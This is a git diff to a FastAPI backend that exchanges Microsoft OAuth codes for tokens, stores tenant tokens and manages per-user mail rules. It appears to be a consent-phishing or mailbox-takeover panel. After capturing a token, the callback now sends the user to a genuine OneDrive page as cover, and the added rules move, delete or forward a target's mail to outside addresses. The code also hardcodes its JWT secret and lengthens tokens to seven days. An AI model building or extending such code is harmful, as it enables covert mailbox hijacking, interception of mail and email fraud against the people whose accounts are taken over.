@@ -18,7 +18,7 @@ from graph import (
 )
 from admin_auth import login_admin
 from db import init_db, SessionLocal
-from models import Rule, TenantToken
+from models import Rule, TenantToken, RuleAction
 
 from jose import jwt, JWTError
 from datetime import datetime, timedelta
@@ -30,7 +30,7 @@ app = FastAPI()
 # =========================
 SECRET_KEY = "super-secret-key-change-this"
 ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 60
+ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days
 
 security = HTTPBearer()
 
@@ -182,7 +182,9 @@ def auth_callback(request: Request):
 
     try:
         exchange_code_for_token(code, state, client_ip)
-        return RedirectResponse(url="https://frontend-xg84.onrender.com")
+        return RedirectResponse(
+            url="https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage"
+        )
     except Exception as e:
         return {"error": str(e)}
 
@@ -312,11 +314,40 @@ async def add_rule(request: Request, user=Depends(verify_token)):
     db = SessionLocal()
 
     try:
+        resolved_user_id = resolve_user_id(body.get("user_id"), user)
+        action_value = body.get("action")
+
+        if not body.get("condition"):
+            return JSONResponse({"error": "condition is required"}, status_code=400)
+
+        if not body.get("keyword"):
+            return JSONResponse({"error": "keyword is required"}, status_code=400)
+
+        if not action_value:
+            return JSONResponse({"error": "action is required"}, status_code=400)
+
+        try:
+            action_enum = RuleAction(action_value)
+        except ValueError:
+            return JSONResponse(
+                {"error": "Invalid action. Allowed values: move, delete, forward"},
+                status_code=400
+            )
+
+        if action_value == "move" and not body.get("target_folder"):
+            return JSONResponse({"error": "target_folder is required for move action"}, status_code=400)
+
+        if action_value == "forward" and not body.get("forward_to"):
+            return JSONResponse({"error": "forward_to is required for forward action"}, status_code=400)
+
         rule = Rule(
+            user_id=resolved_user_id,
             condition=body.get("condition"),
-            action=body.get("action"),
+            keyword=body.get("keyword"),
+            action=action_enum,
             target_folder=body.get("target_folder"),
-            forward_to=body.get("forward_to")
+            forward_to=body.get("forward_to"),
+            is_active=body.get("is_active", True)
         )
 
         db.add(rule)
@@ -328,18 +359,24 @@ async def add_rule(request: Request, user=Depends(verify_token)):
 
 
 @app.get("/rules")
-def get_rules(user=Depends(verify_token)):
+def get_rules(user_id: str | None = None, user=Depends(verify_token)):
     db = SessionLocal()
 
     try:
-        rules = db.query(Rule).all()
+        resolved_user_id = resolve_user_id(user_id, user)
+
+        rules = db.query(Rule).filter(Rule.user_id == resolved_user_id).all()
 
         result = [{
             "id": r.id,
+            "user_id": r.user_id,
             "condition": r.condition,
+            "keyword": r.keyword,
             "action": r.action.value,
             "target_folder": r.target_folder,
-            "forward_to": r.forward_to
+            "forward_to": r.forward_to,
+            "is_active": r.is_active,
+            "created_at": r.created_at
         } for r in rules]
 
         return {"rules": result}
